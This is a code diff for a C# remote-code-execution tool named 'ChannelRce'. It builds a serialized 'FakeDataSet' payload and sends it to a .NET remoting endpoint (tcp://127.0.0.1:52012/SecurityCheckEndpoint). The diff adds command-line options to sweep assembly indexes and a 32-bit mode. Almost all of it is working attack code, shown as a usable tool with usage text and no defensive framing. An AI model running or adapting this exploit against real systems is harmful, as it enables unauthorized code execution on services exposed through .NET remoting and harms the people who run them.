@@ -106,10 +106,10 @@ namespace ChannelRce
             return stm.ToArray();
         }
 
-        public static byte[] LoadAsmTorce(int asm_index)
+        public static byte[] LoadAsmTorce(int asm_index, int asm_end, bool newmode)
         {
 
-            object o = new FakeDataSet(asm_index);
+            object o = new FakeDataSet(asm_index, asm_end, newmode);
             byte[] data = SerializeObject(o, false);
             return data;
         }
@@ -225,7 +225,7 @@ namespace ChannelRce
                 return "Error, invalid return message.";
             }
         }
-        static void Exploit(int asm_index)
+        static void Exploit(int asm_index, int asm_end, bool newmode)
         {
 
             Uri _uri = new Uri("tcp://127.0.0.1:52012/SecurityCheckEndpoint", UriKind.Absolute);
@@ -248,7 +248,7 @@ namespace ChannelRce
             //  byte[] data = SerializeObject();
 
 
-            byte[] data = LoadAsmTorce(asm_index);
+            byte[] data = LoadAsmTorce(asm_index, asm_end, newmode);
 
             MemoryStream stm1 = new MemoryStream();
             BinaryWriter writer = new BinaryWriter(stm1);
@@ -280,16 +280,50 @@ namespace ChannelRce
             return;
 
         }
+
+        static void Help()
+        {
+
+            Console.WriteLine("[Useage Description : start = start assembly search index, end = end assembly search index ]");
+            Console.WriteLine("[New Mode Support 32bit]");
+            Console.WriteLine("tool.exe -n start end");
+            Console.WriteLine("[Sequence Mode Only Work On 64bit]");
+            Console.WriteLine("tool.exe -s start end");
+
+
+        }
         static void Main(string[] args)
         {
-            int asmstart = 3;
-            int asmend = 10;
-            Exploit(0);
-            for (int i = asmstart; i < asmend; i++)
+            if (args.Length < 3)
             {
-                Exploit(i);
+                Help();
+                return;
             }
-          
+
+            bool newmode = false;
+            if (args[0] == "-n")
+            {
+                newmode = true;
+            }
+
+
+            int asmstart = int.Parse(args[1]);
+            int asmend = int.Parse(args[2]);
+            Exploit(0, 0, false);
+
+            if (newmode)
+            {
+                Exploit(asmstart, asmend, newmode);
+            }
+            else
+            {
+                for (int i = asmstart; i < asmend; i++)
+                {
+                    Exploit(i,0, newmode);
+                }
+            }
+
+            return;
         }
     }
 }
